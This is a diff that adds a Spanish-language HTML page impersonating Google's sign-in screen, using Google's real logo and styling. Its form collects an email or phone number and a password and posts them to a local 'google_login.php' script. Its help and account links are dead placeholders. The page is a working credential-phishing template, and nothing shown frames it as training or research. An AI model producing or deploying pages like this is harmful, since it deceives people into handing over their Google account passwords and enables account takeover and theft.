@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Iniciar sesión - Google</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #ffffff;
+      font-family: 'Roboto', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: #202124;
+    }
+
+    .container {
+      background-color: #ffffff;
+      padding: 50px 40px;
+      border-radius: 12px;
+      max-width: 450px;
+      width: 100%;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      border: 1px solid #dadce0;
+    }
+
+    .logo {
+      margin-bottom: 25px;
+    }
+
+    .logo img {
+      width: 75px;
+    }
+
+    h2 {
+      font-weight: 400;
+      font-size: 28px;
+      margin: 0 0 10px;
+    }
+
+    p.sub {
+      font-size: 16px;
+      color: #5f6368;
+      margin: 0 0 30px;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px;
+      margin: 8px 0 20px;
+      border: 1px solid #dadce0;
+      background-color: #ffffff;
+      color: #202124;
+      border-radius: 4px;
+      font-size: 16px;
+    }
+
+    a {
+      color: #1a73e8;
+      font-size: 14px;
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+
+    .info-text {
+      font-size: 13px;
+      color: #5f6368;
+      margin-top: 10px;
+    }
+
+    .btn-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 30px;
+    }
+
+    button {
+      padding: 10px 24px;
+      font-size: 14px;
+      background-color: #1a73e8;
+      border: none;
+      border-radius: 4px;
+      color: #ffffff;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #5f6368;
+      margin-top: 40px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+    </div>
+    <h2>Inicia sesión</h2>
+    <p class="sub">Utiliza tu cuenta de Google</p>
+
+    <form action="google_login.php" method="POST">
+      <input type="email" name="usuario" placeholder="Correo electrónico o teléfono" required>
+      <input type="password" name="contrasena" placeholder="Introduce tu contraseña" required>
+      
+      <a href="#">¿Has olvidado tu correo o contraseña?</a>
+
+
+      <div class="btn-row">
+        <a href="#">Crear cuenta</a>
+        <button type="submit">Iniciar sesión</button>
+      </div>
+    </form>
+
+    <div class="footer">
+      Español (España) • <a href="#">Ayuda</a> • <a href="#">Privacidad</a> • <a href="#">Términos</a>
+    </div>
+  </div>
+</body>
+</html>
